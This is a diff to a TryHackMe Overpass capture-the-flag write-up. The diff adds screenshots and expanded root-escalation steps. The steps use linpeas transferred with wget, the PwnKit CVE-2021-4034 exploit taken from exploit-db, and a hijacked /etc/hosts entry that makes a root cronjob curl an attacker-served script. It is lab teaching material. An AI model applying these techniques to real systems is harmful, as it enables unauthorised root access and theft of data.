@@ -157,7 +157,15 @@ Nice. Now, let's get the root flag.
 
 Now, to make life a little easy, let's try to get an enumeration tool, such as linpeas onto the target machine.
 
-Note: linpeas, as well as winpeas, can be downloaded from the official author's GitHub page: https://github.com/carlospolop/PEASS-ng 
+Note: linpeas can be installed by using the command ``sudo apt install peass``, which will also install other tools alongside it. You can then type ``linpeas`` into the terminal and you should be directed into the directory where linpeas.sh is.
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200117080-91fe0198-cc44-4e3e-860a-af2a07ad925a.png)
+
+<br>
+
+Now that we have it on our host machine, let's get it over to the target.
 
 First, I'll open up a http server with python on my host machine, in the directory where linpeas.sh is:
 
@@ -175,7 +183,11 @@ And then, on the target machine, I'll use wget to download the linpeas.sh file. 
 
 <br>
 
-And now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:
+![billede](https://user-images.githubusercontent.com/78546461/200117504-4cfe9f90-7e10-47f9-902d-0cd80897bea3.png)
+
+<br>
+
+Now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:
 
 <br>
 
@@ -189,11 +201,17 @@ And then run it:
 
 ``./linpeas.sh``
 
-<br><br>
+<br>
 
 linpeas will show a lot of information. And a lot of it is not really of interest to us. However, it does show us a couple of interesting things, that can be potentially exploited. 
 
-The first one is a very likely exploit, found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31). 
+A pretty certain exploit has been found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31). 
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200117628-c4cac89d-d8c5-4545-be2a-e7ed1775990d.png)
+
+<br>
 
 Further down, it tells us a download link from github which we technically could use wget a command to get, but it doesn't seem to be working very well on our target.. 
 However, we can look it up on exploit-db and see what it's all about: 
@@ -201,6 +219,12 @@ However, we can look it up on exploit-db and see what it's all about:
 https://www.exploit-db.com/exploits/50689
 
 <br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200117740-99f56183-8f5b-4cc4-8416-26eeefbe4876.png)
+
+![billede](https://user-images.githubusercontent.com/78546461/200117786-c036220c-7e5d-4792-b8d0-31f799167221.png)
+  
+
 
 Ah. So we can actually just create a couple of files in our tmp directory, based on the code from the website, and then run the code afterwards, using the commands shown.
 
@@ -218,7 +242,7 @@ And we put the code from the page, where it says "##### evil-so.c #####", into t
 
 And we do the same thing here as well, copy-pasting the code, where it says "##### exploit.c #####". 
 
-<br><br>
+<br>
 
 Just to be sure, I make the files executable:
 
@@ -240,17 +264,22 @@ And then run the file called "exploit":
 
 ``./exploit``
 
-<br><br>
+<br>
 
-BOOM! We are root! 
+![billede](https://user-images.githubusercontent.com/78546461/200117961-943d8a39-07a6-4fa0-b192-ba641f7906ed.png)
 
-``whoami``
+
+BOOM! We are root! Don't mind the error messages, the exploit will still work, as you can see.
 
 <br>
 
 Now, we don't have an interactive shell, but that can easily be solved with:
 
 ``/bin/bash``
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200118042-5b60aa5d-38f7-4951-9bfe-8e94fbbcacda.png)
 
 <br>
 
@@ -290,7 +319,17 @@ Hmmm... Wonder if we can do anything with that.. hehe..
 
 If we take a look into the folder /etc/hosts, we'll actually find *overpass.thm* and the corresponding IP address. 
 
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200118118-b837c5e7-38b0-43ec-a3cb-fea06f373482.png)
+
+<br>
+
 And guess what.. the file is world-writable! So we can just edit it if we want.. Oh boy, this means trouble!
+
+<br>
+
+![billede](https://user-images.githubusercontent.com/78546461/200118158-1fe3d3fa-eb9e-4251-9f86-08a37641c694.png)
 
 <br>
 
@@ -308,15 +347,39 @@ So, on our host machine, we can go into the / directory, ``cd /`` and then use t
 
 And then we can write our script, which will be executed by the target, with root privileges. Let's not forget the *#!/bin/bash* at the top of our script:
 
-``#!/bin/bash
+```#!/bin/bash
 
-  sudo cp /root/root.txt /root.txt && chmod +r /root.txt james``
+  sudo cp /root/root.txt /root.txt && chmod +r /root.txt james```
   
 <br>
 
-And then, we can go back into the / directory, and with ``ls -l``, we can see that we now have a *root.txt* file, which we can read from.
+![billede](https://user-images.githubusercontent.com/78546461/200118218-4a27d127-cfc8-4e04-b4bc-8cac32d530b8.png)
 
-Let's read it then! ``cat root.txt``
+<br>
+
+This will first copy the root.txt file from the /root directory, into the / directory and then, it will change the file mode bits for the root.txt file, so that James also can read it.
+
+<br>
+
+Now, we change the IP for overpass.thm in the /etc/hosts file on the target, to our IP:
+
+``nano /etc/hosts``
+
+<br>
+
+A cool little trick we can do, is to watch changes to a directory in real time. So we can actually see if something is happening on the target:
+
+``watch ls -l /``
+
+And then we open up a port, on port 80, on our host machine. This is where the curl command from the target (in the cronjob) will attempt to fetch the "buildscript.sh" from.
+
+``sudo python3 -m http.server 80``
+
+<br>
+
+Now that we have the file, let's read it! 
+
+``cat root.txt``
 
 <br>
 
@@ -337,4 +400,4 @@ However, feel free coming up with new ways of getting the root flag, by editing 
 <br><br>
 
 
-#### Made by PatrickSkovgaard, otherwise known as AgoraPat on TryHackMe 
+#### Made by PatrickSkovgaard (GitHub)
